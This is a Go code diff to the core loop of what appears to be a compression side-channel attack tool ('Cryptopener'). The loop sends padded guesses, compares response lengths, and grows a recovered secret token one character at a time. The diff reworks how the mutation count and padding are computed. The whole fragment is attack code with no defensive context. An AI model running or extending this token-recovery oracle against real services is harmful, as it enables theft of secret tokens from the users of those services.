@@ -48,7 +48,7 @@ func createPadding() string {
 	return ret
 }
 
-func pow(x int, n int) int {
+func Pow(x int, n int) int {
 	var ret int
 	if n == 0 {
 		ret = 1
@@ -74,11 +74,15 @@ func (p *Cryptopener) Run() {
 	p.ResultToken = ""
 	padding := ""
 	for {
-		time.Sleep(0 * time.Millisecond)
 		var payload []byte
+		y = 0
+		for i := 1; i <= x; i++ {
+			y = y + Pow(p.mutator.tokenCount, i)
+		}
+
 		if checkBaseLength {
 			// create new payload
-			for i := 0; i < int(math.Floor(float64(p.mutator.mutations / 60))) + 1; i++ {
+			for i := 0; i < int(math.Floor(float64(p.mutator.mutations / int64(y)))) + 1; i++ {
 				payload = []byte(string(payload) + string(dummy_chars[rand.Intn(11)]))
 			}
 			payload = []byte(p.ResultToken + string(payload))
@@ -96,22 +100,16 @@ func (p *Cryptopener) Run() {
 			response := p.client.SendMessage(string(payload), padding)
 			temp_length = p.analyseResponse(response)
 
-			y = 61
-			for i := 2; i <= x; i++ {
-				y = y + pow(61, i)
-			}
-			y++
-
 			if temp_length < base_length {
 				p.ResultToken = string(p.ResultToken) + string(mutpayload)
 				p.mutator = NewMutator()
 				checkBaseLength = true
 				correct_count++
 				x = 1
-			} else if p.mutator.mutations % int64(y) == 0 {
+			} else if p.mutator.mutations - int64(y) == 0 {
 				x++
 				checkBaseLength = true
-				if x == 3 {
+				if x % 2 == 0 {
 					padding = padding + createPadding()
 				}
 			}
